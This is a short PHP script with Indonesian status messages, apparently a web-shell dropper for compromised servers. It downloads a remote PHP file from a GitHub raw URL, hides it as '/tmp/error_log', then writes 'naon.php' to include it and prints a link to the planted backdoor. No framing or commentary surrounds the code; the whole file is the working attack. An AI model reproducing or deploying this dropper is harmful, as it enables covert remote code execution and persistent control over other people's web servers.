<?php
$wkwk = 'https://raw.githubusercontent.com/bellerwalker/pen-php/main/t.php';
$wkwwkwk = '/tmp/error_log';
$wkwkwkk = 'naon.php';

if (!copy($wkwk, $wkwwkwk)) {
    $error = error_get_last();
    echo "TIDAK BERHASIL $wkwk. Error: " . $error['message'];
    exit;
}

$php_code = "<?php include('$wkwwkwk'); ?>";

$file_handle = fopen($wkwkwkk, 'w');
if ($file_handle === false) {
    $error = error_get_last();
    echo "NOT VULN $wkwkwkk. Error: " . $error['message'];
    exit;
}

if (fwrite($file_handle, $php_code) === false) {
    $error = error_get_last();
    echo "GAGAL TOTAL $wkwkwkk. Error: " . $error['message'];
    fclose($file_handle);
    exit;
}

fclose($file_handle);

echo "GASKAN CLEK! <a href='$wkwkwkk'>$wkwkwkk</a>";